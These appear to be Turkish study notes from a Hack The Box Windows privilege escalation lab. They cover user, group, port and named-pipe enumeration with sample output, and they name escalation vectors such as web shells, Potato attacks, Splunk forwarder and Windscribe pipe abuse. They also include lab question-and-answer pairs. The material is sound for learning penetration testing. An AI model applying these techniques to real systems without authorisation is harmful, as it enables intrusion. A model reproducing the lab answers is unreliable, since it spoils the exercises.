NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

#### **Get All Users**  

Sistemde başka hangi kullanıcıların olduğunu bilmek de önemlidir. Bir `bob` kullanıcısı için yakaladığımız kimlik bilgilerini kullanarak bir host'a RDP erişimi elde ettiysek ve local administrators grubunda bir `bob_adm` kullanıcısı gördüysek, kimlik bilgilerinin yeniden kullanılıp kullanılmadığını kontrol etmeye değer. Önemli kullanıcılar için kullanıcı profili dizinine erişebilir miyiz? Bir kullanıcının Desktop, Documents veya Downloads klasöründe parolalar veya SSH anahtarları içeren komut dosyaları gibi değerli dosyalar bulabiliriz.

```cmd-session
C:\htb> net user

User accounts for \\WINLPE-SRV01

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
helpdesk                 htb-student              jordan
sarah                    secsvc
The command completed successfully.
```


#### **Get All Groups**  

Hostta hangi standart dışı grupların bulunduğunu bilmek, hostun ne için kullanıldığını, ne kadar yoğun erişildiğini belirlememize yardımcı olabilir veya Remote Desktop veya local administrators gruplarındaki tüm Domain Kullanıcıları gibi bir yanlış yapılandırmayı keşfetmemize bile yol açabilir.

```cmd-session
C:\htb> net localgroup

Aliases for \\WINLPE-SRV01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Certificate Service DCOM Access
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Print Operators
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Storage Replica Administrators
*System Managed Accounts Group
*Users
The command completed successfully.
```


#### **Bir Grup Hakkında Ayrıntılar**  

Standart olmayan gruplar için ayrıntıları kontrol etmeye değer. Pek olası olmasa da, grubun açıklamasında saklanan bir parola veya başka ilginç bilgiler bulabiliriz. Numaralandırma sırasında, ayrıcalıkları yükseltmek için kullanılabilecek lokal bir grubun üyesi olan başka bir yönetici olmayan kullanıcının kimlik bilgilerini keşfedebiliriz.

```cmd-session
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
helpdesk
sarah
secsvc
The command completed successfully. 
```


#### **Şifre Politikası ve Diğer Hesap Bilgilerini Alın**
```cmd-session
C:\htb> net accounts

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          42
Minimum password length:                              0
Length of password history maintained:                None
Lockout threshold:                                    Never
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.
```

## **Devam Ediyoruz**  

Daha önce de belirtildiği gibi, bu liste numaralandırma komutlarının kapsamlı bir listesi değildir. Önceki bölümde tartıştığımız araçlar, numaralandırma sürecini hızlandırmaya ve hiçbir taş bırakılmadan kapsamlı olmasını sağlamaya büyük ölçüde yardımcı olacaktır. Bize yardımcı olacak birçok hile sayfası mevcuttur, örneğin [bu](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md). Araçları ve çıktılarını inceleyin ve kendi komut hile sayfanızı oluşturmaya başlayın, böylece çoğunlukla veya tamamen manuel numaralandırma gerektiren bir ortamla karşılaşmanız durumunda hazır olur.




Soru : htb-student kullanıcısının varsayılan olmayan hangi ayrıcalığı vardır?
cevap : SeTakeOwnershipPrivilege

![Pasted image 20241112122423.png](/img/user/resimler/Pasted%20image%2020241112122423.png)


Soru : Backup Operators grubunun üyesi kimdir?
cevap : sarah

![Pasted image 20241112122550.png](/img/user/resimler/Pasted%20image%2020241112122550.png)

![Pasted image 20241112122858.png](/img/user/resimler/Pasted%20image%2020241112122858.png)

Soru : Hangi hizmet 8080 numaralı portu dinliyor (yürütülebilir dosyanın değil hizmetin adı)?
Cevap : 

![Pasted image 20241112123107.png](/img/user/resimler/Pasted%20image%2020241112123107.png)

![Pasted image 20241112123206.png](/img/user/resimler/Pasted%20image%2020241112123206.png)

![Pasted image 20241112123155.png](/img/user/resimler/Pasted%20image%2020241112123155.png)

Soru : Hedef hostta hangi kullanıcı oturum açtı?
Cevap : 

![Pasted image 20241112123422.png](/img/user/resimler/Pasted%20image%2020241112123422.png)


Soru : Bu kullanıcının ne tür bir oturumu var?
Cevap : 
![Pasted image 20241112123507.png](/img/user/resimler/Pasted%20image%2020241112123507.png)



# **Proseslerle İletişim**

Ayrıcalık yükseltme için bakılacak en iyi yerlerden biri sistemde çalışan proseslerdir. Bir proses administrator olarak çalışmıyor olsa bile, ek ayrıcalıklara yol açabilir. En yaygın örnek, kutuda çalışan IIS veya XAMPP gibi bir web sunucusunu keşfetmek, kutuya bir `aspx/php` shell yerleştirmek ve web sunucusunu çalıştıran kullanıcı olarak bir shell elde etmektir. Genellikle bu bir administrator değildir, ancak genellikle `SeImpersonate` token'ına sahip olur ve `Rogue/Juicy/Lonely Potato` 'nun SYSTEM izinlerini sağlamasına izin verir.


## Access Tokens

Windows'ta, [**access token**'lar](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens) bir **process** veya **thread**'in güvenlik bağlamını (güvenlik nitelikleri veya kuralları) tanımlamak için kullanılır. Token, bir process veya thread ile ilgili kullanıcı hesabının kimlik ve ayrıcalıkları hakkında bilgi içerir. Bir kullanıcı sisteme kimlik doğrulama yaptığında, parolası güvenlik veritabanına karşı doğrulanır ve doğru şekilde doğrulanırsa kendisine bir **access token** atanır. Kullanıcı bir process ile her etkileşime girdiğinde, bu token'ın bir kopyası kullanıcıya sunularak ayrıcalık düzeyleri belirlenir.


## Enumerating Network Services
İnsanların proseslerle etkileşime girmesinin en yaygın yolu bir ağ soketidir (DNS, HTTP, SMB, vb.). [netstat](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat) komutu aktif TCP ve UDP bağlantılarını göstererek hangi servislerin hem localde hem de dışarıda hangi port(lar)ı dinlediği konusunda bize daha iyi bir fikir verecektir. Ayrıcalıkları artırmak için kullanabileceğimiz, yalnızca localhost tarafından erişilebilen ( hostta oturum açıldığında) savunmasız bir servise rastlayabiliriz.


#### Display Active Network Connections

```cmd-session
C:\htb> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       3812
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       836
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       936
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       5044
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       528
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       996
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1260
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2008
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       600
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       1888
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       616
  TCP    10.129.43.8:139        0.0.0.0:0              LISTENING       4
  TCP    10.129.43.8:3389       10.10.14.3:63191       ESTABLISHED     936
  TCP    10.129.43.8:49671      40.67.251.132:443      ESTABLISHED     1260
  TCP    10.129.43.8:49773      52.37.190.150:443      ESTABLISHED     2608
  TCP    10.129.43.8:51580      40.67.251.132:443      ESTABLISHED     3808
  TCP    10.129.43.8:54267      40.67.254.36:443       ESTABLISHED     3808
  TCP    10.129.43.8:54268      40.67.254.36:443       ESTABLISHED     1260
  TCP    10.129.43.8:54269      64.233.184.189:443     ESTABLISHED     2608
  TCP    10.129.43.8:54273      216.58.210.195:443     ESTABLISHED     2608
  TCP    127.0.0.1:14147        0.0.0.0:0              LISTENING       3812

<SNIP>

  TCP    192.168.20.56:139      0.0.0.0:0              LISTENING       4
  TCP    [::]:21                [::]:0                 LISTENING       3812
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       836
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3389              [::]:0                 LISTENING       936
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:8080              [::]:0                 LISTENING       5044
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       528
  TCP    [::]:49665             [::]:0                 LISTENING       996
  TCP    [::]:49666             [::]:0                 LISTENING       1260
  TCP    [::]:49668             [::]:0                 LISTENING       2008
  TCP    [::]:49669             [::]:0                 LISTENING       600
  TCP    [::]:49670             [::]:0                 LISTENING       1888
  TCP    [::]:49674             [::]:0                 LISTENING       616
  TCP    [::1]:14147            [::]:0                 LISTENING       3812
  UDP    0.0.0.0:123            *:*                                    1104
  UDP    0.0.0.0:500            *:*                                    1260
  UDP    0.0.0.0:3389           *:*                                    936

<SNIP>
```

**Active Network Connections** ile ilgili bakılması gereken ana şey, **loopback** adreslerinde (127.0.0.1 ve ::1) dinleyen ancak IP Adresinde (10.129.43.8) veya **broadcast** adreslerinde (0.0.0.0, ::/0) dinlemeyen girişlerdir. Bunun nedeni, **localhost** üzerindeki ağ soketlerinin "ağa erişilebilir olmadıkları" düşüncesi nedeniyle genellikle güvensiz olmalarıdır. Hemen dikkat çeken port 14147 olacaktır; bu port, FileZilla'nın yönetim arayüzü için kullanılır. Bu porta bağlanarak, FTP şifrelerini çıkarmak ve FileZilla Server kullanıcısı (potansiyel olarak Administrator) olarak c:'de bir FTP Share oluşturmak mümkün olabilir.


#### **Daha Fazla Örnek**  

Bu tür ayrıcalık yükseltmenin en iyi örneklerinden biri, günlükleri Splunk'a göndermek için endpointlere kurulan Splunk `Universal Forwarder`'dır. Splunk'ın varsayılan yapılandırmasında yazılım üzerinde herhangi bir kimlik doğrulaması yoktu ve herkesin kod yürütülmesine yol açabilecek uygulamaları dağıtmasına izin veriyordu. Yine, Splunk'ın varsayılan yapılandırması düşük ayrıcalıklı bir kullanıcı olarak değil SYSTEM$ olarak çalıştırılmasıydı. Daha fazla bilgi için [Splunk Universal Forwarder Hijacking](https://airman604.medium.com/splunk-universal-forwarder-hijacking-5899c3e0e6b2) ve [SplunkWhisperer2](https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/) bölümlerine göz atın.

Gözden kaçan ancak yaygın bir başka local ayrıcalık yükseltme vektörü de `Erlang Portudur` (25672). Erlang, dağıtık hesaplama etrafında tasarlanmış bir programlama dilidir ve diğer Erlang node'larının kümeye katılmasına izin veren bir ağ portuna sahip olacaktır. Bu kümeye katılmanın sırrı cookie olarak adlandırılır. Erlang kullanan birçok uygulama ya zayıf bir cookie kullanır (RabbitMQ varsayılan olarak `rabbit` kullanır) ya da cookie'yi iyi korunmayan bir yapılandırma dosyasına yerleştirir. Bazı örnek Erlang uygulamaları SolarWinds, RabbitMQ ve CouchDB'dir. Daha fazla bilgi için [Mubix'in Erlang-arce blog yazısına](https://malicious.link/post/2018/erlang-arce/) göz atın


## **Named Pipes**  

Proseslerin birbirleriyle iletişim kurmasının diğer bir yolu da Named Pipes'tır. Pipes aslında bellekte saklanan ve okunduktan sonra temizlenen dosyalardır. Cobalt Strike her komut için ( [BOF](https://www.cobaltstrike.com/help-beacon-object-files) hariç) Named Pipes kullanır. Esasen iş akışı şuna benzer:

1. Beacon \.\pipe\msagent_12 şeklinde bir named pipe başlatır  
2. Beacon yeni bir proses başlatır ve bu prosese komut enjekte ederek çıktıyı \.\pipe\msagent_12 adresine yönlendirir  
3. Sunucu \.\pipe\msagent_12 içine yazılanları görüntüler

Cobalt Strike bunu yaptı çünkü çalıştırılan komut antivirüs tarafından işaretlenirse veya çökerse, işaretçiyi (komutu çalıştıran proses) etkilemeyecekti. Cobalt Strike kullanıcıları genellikle başka bir program gibi görünmek için named pipe'larını değiştirirler. En yaygın örneklerden biri msagent yerine mojo kullanmaktır. En sevdiğim bulgularımdan biri mojo ile başlayan bir named pipe bulmaktı, ancak bilgisayarın kendisinde Chrome yüklü değildi. Neyse ki bunu şirketin iç kırmızı ekibinin yaptığı ortaya çıktı. Dışarıdan bir danışmanın kırmızı ekibi bulması, ancak içerideki mavi ekibin bulamaması çok şey ifade ediyor.


#### More on Named Pipes
**Named Pipes** hakkında daha fazla bilgi: **Pipes**, paylaşılan bellek kullanarak iki uygulama veya **process** arasında iletişim sağlamak için kullanılır. İki tür pipe bulunur: [named pipes ](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes)ve anonymous pipes. Named pipe’a bir örnek, `\\.\PipeName\\ExampleNamedPipeServer` şeklindedir. Windows sistemlerinde, pipe iletişimi için bir **client-server** yapısı uygulanır. Bu yapıda, named pipe oluşturan process **server** rolünü üstlenirken, named pipe ile iletişim kuran process **client** olarak görev yapar. Named pipes, yarı-duplex (tek yönlü), yani sadece client’ın server’a veri yazabildiği bir iletişim kanalı veya duplex (çift yönlü), yani client’ın veri yazabilmesine ve server’ın da aynı pipe üzerinden geri yanıt verebilmesine olanak tanıyan bir iletişim kanalı olarak kullanılabilir. Named pipe server’a her aktif bağlantı, yeni bir named pipe oluşturulmasına yol açar. Bu pipe'lar aynı adı paylaşır ancak farklı bir data buffer üzerinden iletişim sağlar.

Name pipe'ların örneklerini numaralandırmak için Sysinternals Suite'teki [PipeList](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist) aracını kullanabiliriz.


#### **Pipelist ile Adlandırılmış Pipe'ları Listeleme**

```cmd-session
C:\htb> pipelist.exe /accepteula

PipeList v1.02 - Lists open named pipes
Copyright (C) 2005-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Pipe Name                                    Instances       Max Instances
---------                                    ---------       -------------
InitShutdown                                      3               -1
lsass                                             4               -1
ntsvcs                                            3               -1
scerpc                                            3               -1
Winsock2\CatalogChangeListener-340-0              1                1
Winsock2\CatalogChangeListener-414-0              1                1
epmapper                                          3               -1
Winsock2\CatalogChangeListener-3ec-0              1                1
Winsock2\CatalogChangeListener-44c-0              1                1
LSM_API_service                                   3               -1
atsvc                                             3               -1
Winsock2\CatalogChangeListener-5e0-0              1                1
eventlog                                          3               -1
Winsock2\CatalogChangeListener-6a8-0              1                1
spoolss                                           3               -1
Winsock2\CatalogChangeListener-ec0-0              1                1
wkssvc                                            4               -1
trkwks                                            3               -1
vmware-usbarbpipe                                 5               -1
srvsvc                                            4               -1
ROUTER                                            3               -1
vmware-authdpipe                                  1                1

<SNIP>
```

- **Instances**: Bu, o an kullanılan belirli bir named pipe’ın aktif bağlantı sayısını gösterir. Her pipe, bir veya daha fazla bağlantı (instance) alabilir, bu yüzden burada gösterilen sayı, o pipe üzerinde kaç aktif bağlantı olduğunu belirtir.
    
- **Max Instances**: Bu, o pipe üzerinde desteklenebilecek maksimum bağlantı sayısını gösterir. `-1` değeri, sınırsız bağlantıya izin verildiğini belirtir. Diğer değerler ise, o pipe için sınırlı sayıda bağlantı olduğunu gösterir. Örneğin, `1` değeri, pipe’ın yalnızca tek bir bağlantı alabileceği anlamına gelir.


#### Listing Named Pipes with PowerShell

```powershell-session
PS C:\htb>  gci \\.\pipe\


    Directory: \\.\pipe


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              3 InitShutdown
------       12/31/1600   4:00 PM              4 lsass
------       12/31/1600   4:00 PM              3 ntsvcs
------       12/31/1600   4:00 PM              3 scerpc


    Directory: \\.\pipe\Winsock2


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              1 Winsock2\CatalogChangeListener-34c-0


    Directory: \\.\pipe


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              3 epmapper

<SNIP>
```

- **LastWriteTime**: Bu sütun, named pipe'a yapılan en son yazma işleminin tarih ve saatini gösterir. Ancak burada görüldüğü gibi, tüm değerler "12/31/1600" tarihini göstermekte; bu tarih, genellikle geçerli bir zaman damgası sağlanmadığında varsayılan olarak görüntülenir.
    
- **Length**: Bu sütun normalde bir dosya veya nesnenin boyutunu gösterir, ancak named pipe’larda veri uzunluğunu belirtmez. Pipe bağlantılarının uzunluk bilgisi burada anlamlı bir bilgi sağlamaz, bu nedenle genellikle bu değerin anlamı belirsiz kalır.
    
- **Name**: Bu sütun ise named pipe'ın adını gösterir. Örneğin `InitShutdown`, `lsass` ve `epmapper` gibi pipe adları burada listelenmiştir.


Names pipe'ların bir listesini elde ettikten sonra, [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) 'yi kullanarak, bir kaynağı değiştirme, yazma, okuma veya yürütme izinlerine kimlerin sahip olduğunu gösteren Discretionary Access List'i (İsteğe Bağlı Erişim Listesi) (DACL) inceleyerek belirli bir named pipe'a atanan izinleri sıralayabiliriz. `LSASS` prosesine bir göz atalım. .\accesschk.exe /accepteula \pipe\ komutunu kullanarak tüm named pipe'ların DACL'lerini de inceleyebiliriz.


#### **LSASS Named Pipe İzinlerini Gözden Geçirme**

```cmd-session
C:\htb> accesschk.exe /accepteula \\.\Pipe\lsass -v

Accesschk v6.12 - Reports effective permissions for securable objects
Copyright (C) 2006-2017 Mark Russinovich
Sysinternals - www.sysinternals.com

\\.\Pipe\lsass
  Untrusted Mandatory Level [No-Write-Up]
  RW Everyone
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
        SYNCHRONIZE
        READ_CONTROL
  RW NT AUTHORITY\ANONYMOUS LOGON
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
        SYNCHRONIZE
        READ_CONTROL
  RW APPLICATION PACKAGE AUTHORITY\Your Windows credentials
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
        SYNCHRONIZE
        READ_CONTROL
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
```

Yukarıdaki çıktıdan, beklendiği gibi yalnızca yöneticilerin LSASS prosesine tam erişime sahip olduğunu görebiliriz.


## Named Pipes Attack Example

Ayrıcalıkları yükseltmek için açık bir named pipe'dan yararlanmanın bir örneğini inceleyelim. Bu [WindscribeService Named Pipe Privilege Escalation](https://www.exploit-db.com/exploits/48021) harika bir örnektir. `accesschk` kullanarak `accesschk.exe -w \pipe\* -v` gibi bir komutla yazma erişimine izin veren tüm named pipe'ları arayabilir ve `WindscribeService` isimli pipe'ın `Everyone` grubuna, yani kimliği doğrulanmış tüm kullanıcılara `READ` ve `WRITE` erişimine izin verdiğini görebiliriz.


#### **WindscribeService Named Pipe İzinlerini Kontrol Etme**

`Accesschk` ile onayladığımızda, Everyone grubunun gerçekten de pipe üzerinde `FILE_ALL_ACCESS` (Tüm olası erişim hakları) yetkisine sahip olduğunu görüyoruz.

```cmd-session
C:\htb> accesschk.exe -accepteula -w \pipe\WindscribeService -v

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

\\.\Pipe\WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
```

Buradan, host üzerindeki ayrıcalıkları SYSTEM'e yükseltmek için bu gevşek izinlerden yararlanabiliriz.


- **accesschk.exe**: Sysinternals AccessChk aracıdır. Windows'ta çeşitli nesnelerin erişim izinlerini listelemek için kullanılır.
    
- **-accepteula**: AccessChk ilk kez çalıştırıldığında Sysinternals EULA (Kullanıcı Lisans Sözleşmesi) onayını gerektirir. Bu parametre, bu onayı otomatik olarak kabul eder, böylece EULA'ya her seferinde manuel olarak onay vermek gerekmez.
    
- **-w**: "Write" yani yazma izinlerini kontrol eder. Bu parametre ile AccessChk, belirtilen nesne veya nesneler üzerinde yazma erişim iznine sahip olan kullanıcıları veya grupları listeleyecektir.
    
- **\pipe\WindscribeService**: Bu, erişim izinlerini kontrol etmek istediğiniz named pipe'ın yoludur. `\pipe\WindscribeService` burada WindscribeService adlı bir named pipe'ı ifade eder.
    
- **-v**: "Verbose" yani detaylı çıktı anlamına gelir. Bu parametre AccessChk’in izinleri ayrıntılı bir şekilde listelemesini sağlar.


`pipe\WindscribeService` yerine başka bir **named pipe** adı yazılabilir. Windows sistemlerinde kullanılan bazı yaygın named pipe örnekleri:

- **\pipe\lsass**: `lsass.exe` işlemiyle ilgili bir pipe'dır. (Local Security Authority Subsystem Service)
- **\pipe\scerpc**: `Security Configuration Editor` ile ilişkilidir, güvenlik ayarlarının yönetiminde kullanılır.
- **\pipe\epmapper**: RPC (Remote Procedure Call) uç nokta eşleyicisi için kullanılır.
- **\pipe\InitShutdown**: Sistem kapanış işlemleriyle ilgili bir pipe'dır.
- **\pipe\ntsvcs**: Windows NT hizmetleriyle ilgili bir pipe'dır.
- **\pipe\spoolss**: Yazdırma işlemleri (print spooler) için kullanılır.

Soru : Hangi hizmet 0.0.0.0:21'i dinliyor? (iki kelime)
Cevap : FileZilla Server

![Pasted image 20241113001231.png](/img/user/resimler/Pasted%20image%2020241113001231.png)

![Pasted image 20241113001656.png](/img/user/resimler/Pasted%20image%2020241113001656.png)


Soru : Hangi hesap \pipe\SQLLocal\SQLEXPRESS01 adlı pipe üzerinde WRITE_DAC ayrıcalıklarına sahiptir?
Cevap : NT SERVICE\MSSQL$SQLEXPRESS01

![Pasted image 20241113002146.png](/img/user/resimler/Pasted%20image%2020241113002146.png)


# Windows Privileges Overview

Windows'taPrivileges [Privileges](https://docs.microsoft.com/en-us/windows/win32/secauthz/privileges) , bir hesaba lokal sistem üzerinde hizmetleri yönetme, sürücüleri yükleme, sistemi kapatma, bir uygulamada debug (hata ayıklama) ve daha fazlası gibi çeşitli işlemleri gerçekleştirmek için verilebilen haklardır. Ayrıcalıklar, bir sistemin güvenli nesnelere erişim vermek veya erişimi reddetmek için kullandığı erişim haklarından farklıdır. Kullanıcı ve grup ayrıcalıkları bir veritabanında saklanır ve bir kullanıcı sistemde oturum açtığında bir access token aracılığıyla verilir. Bir hesap, belirli bir bilgisayarda local ayrıcalıklara ve bir Active Directory domain'ine aitse farklı sistemlerde farklı ayrıcalıklara sahip olabilir. Bir kullanıcı ayrıcalıklı bir eylem gerçekleştirmeyi her denediğinde, sistem hesabın gerekli ayrıcalıklara sahip olup olmadığını görmek için kullanıcının access token'ını inceler ve eğer öyleyse, bunların etkin olup olmadığını kontrol eder. Ayrıcalıkların çoğu varsayılan olarak devre dışıdır. Bazıları bir yönetici cmd.exe veya PowerShell konsolu açılarak etkinleştirilebilirken, diğerleri manuel olarak etkinleştirilebilir.

Bir değerlendirmenin amacı genellikle bir sisteme ya da birden fazla sisteme yönetici erişimi sağlamaktır. Bir sistemde belirli ayrıcalıklara sahip bir kullanıcı olarak oturum açabildiğimizi varsayalım. Bu durumda, ayrıcalıkları doğrudan yükseltmek için bu yerleşik fonksiyonellikten yararlanabilir veya nihai hedefimize ulaşmak amacıyla erişimimizi ilerletmek için hedef hesabın atanmış ayrıcalıklarını kullanabiliriz.

## Windows Authorization Process

Security principals, kullanıcı ve bilgisayar hesapları, güvenlik bağlamında veya başka bir kullanıcı/bilgisayar hesabında çalışan prosesler veya bu hesapların ait olduğu güvenlik grupları dahil olmak üzere Windows işletim sistemi tarafından kimliği doğrulanabilen her şeydir. Security principal'lar Windows hosts üzerindeki kaynaklara erişimi denetlemenin birincil yoludur. Her bir security principal benzersiz bir [Security Identifier (SID) ](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows)ile tanımlanır. Bir security principal oluşturulduğunda, ona bir SID atanır ve bu SID kullanım ömrü boyunca o principal'a atanmış olarak kalır.

Aşağıdaki diyagram, bir kullanıcının bir dosya paylaşımındaki bir klasör gibi güvenli bir nesneye erişmeye çalıştığında başlayan **Windows authorization** ve **access control** process'ini üst düzeyde açıklamaktadır. Bu process'te, kullanıcının **access token**'ı (kullanıcı SID'si, üye oldukları grupların SID'leri, ayrıcalık listesi ve diğer erişim bilgileri) nesnenin [**security descriptor**'ında](https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptors) (kullanıcılara veya gruplara verilen erişim haklarını içeren güvenlik bilgilerini barındıran bir güvenli nesne) yer alan [**Access Control Entry](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-entries) (ACE)** ile karşılaştırılır. Bu karşılaştırma tamamlandığında, erişim izni verilip verilmeyeceğine karar verilir. Bir kullanıcı Windows host'taki bir kaynağa erişmeye çalıştığında, bu process neredeyse anında gerçekleşir. **Enumeration** ve **privilege escalation** aktivitelerimizin bir parçası olarak, erişim haklarını kullanmayı ve istismar etmeyi veya bu **authorization** process'ine dahil olmayı deneyerek hedefimize doğru ilerlemeyi amaçlarız.

![Pasted image 20241113012408.png](/img/user/resimler/Pasted%20image%2020241113012408.png)


## **Windows'ta Haklar ve Ayrıcalıklar**  

Windows, üyelerine güçlü haklar ve ayrıcalıklar veren birçok grup içerir. Bunların çoğu, hem bağımsız bir Windows host'unda hem de bir Active Directory domain ortamında ayrıcalıkları yükseltmek için kötüye kullanılabilir. Nihayetinde bunlar bir Windows workstation, sunucu veya Domain Controller (DC) üzerinde Domain Admin, local administrator veya SYSTEM ayrıcalıkları elde etmek için kullanılabilir. Bu gruplardan bazıları aşağıda listelenmiştir.

![Pasted image 20241113013048.png](/img/user/resimler/Pasted%20image%2020241113013048.png)
![Pasted image 20241113013102.png](/img/user/resimler/Pasted%20image%2020241113013102.png)


## **User Rights Assignment (Kullanıcı Hakları Ataması)**  

Grup üyeliğine ve domain ve local Grup Politikası aracılığıyla atanan ayrıcalıklar gibi diğer faktörlere bağlı olarak, kullanıcılar hesaplarına atanmış çeşitli haklara sahip olabilirler. [User Rights Assignment](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment)hakkındaki bu Microsoft makalesi, Windows'ta ayarlanabilen her bir kullanıcı hakkının yanı sıra her bir hak için geçerli olan güvenlik hususları hakkında ayrıntılı bir açıklama sunar. Aşağıda, localhost'a uygulanan ayarlar olan bazı temel kullanıcı hakları atamaları yer almaktadır. Bu haklar, kullanıcıların sistem üzerinde local veya uzaktan oturum açma, host'a ağdan erişme, sunucuyu kapatma vb. gibi görevleri gerçekleştirmelerine olanak tanır.

##### Setting [Constant](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)

- **SeNetworkLogonRight ([Ağ Üzerinden Bu Bilgisayara Erişin](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-this-computer-from-the-network))**
    
    - **Standard Assignment:** Administrators, Authenticated Users
    - **Description:** Bu ayar, hangi kullanıcıların SMB, NetBIOS, CIFS ve COM+ gibi ağ protokolleri aracılığıyla cihaza bağlanabileceğini belirler. Bu hak, ağ üzerindeki diğer cihazlardan bu cihaza erişimi mümkün kılar.

- **SeRemoteInteractiveLogonRight ([Remote Desktop Services ile Oturum Açma](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services))**
    
    - **Standard Assignment:** Administrators, Remote Desktop Users
    - **Description:** Bu ayar, hangi kullanıcıların veya grupların Remote Desktop Services aracılığıyla uzaktaki bir cihazın oturum ekranına erişebileceğini belirler. Bir kullanıcı, belirli bir sunucuya Remote Desktop Services bağlantısı kurabilir ancak o sunucunun konsoluna oturum açamayabilir.

- **SeBackupPrivilege ([Dosya ve Dizin Yedekleme](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories))**
    
    - **Standard Assignment:** Administrators
    - **Description:** Bu kullanıcı hakkı, hangi kullanıcıların dosya ve dizinleri yedekleme amacıyla dosya, dizin, kayıt defteri ve diğer kalıcı nesnelerin izinlerini atlayabileceğini belirler.

- **SeSecurityPrivilege ([Güvenlik Günlüğünü Yönetme](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-auditing-and-security-log))**
    
    - **Standard Assignment:** Administrators
    - **Description:** Bu ayar, hangi kullanıcıların dosyalar, Active Directory nesneleri ve kayıt defteri anahtarları gibi bireysel kaynaklar için denetim seçeneklerine erişebileceğini belirler. Bu kullanıcı hakkına sahip bir kullanıcı ayrıca Event Viewer'da Security log'unu görebilir.

- **SeTakeOwnershipPrivilege ([Dosyaların veya Diğer Nesnelerin Sahipliğini Alma](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects))**
    
    - **Standard Assignment:** Administrators
    - **Description:** Bu ayar, hangi kullanıcıların Active Directory nesneleri, NTFS dosya ve klasörleri, yazıcılar, kayıt defteri anahtarları, servisler, process'ler ve thread'ler dahil olmak üzere cihazdaki güvenlik altına alınabilir nesnelerin sahipliğini alabileceğini belirler.

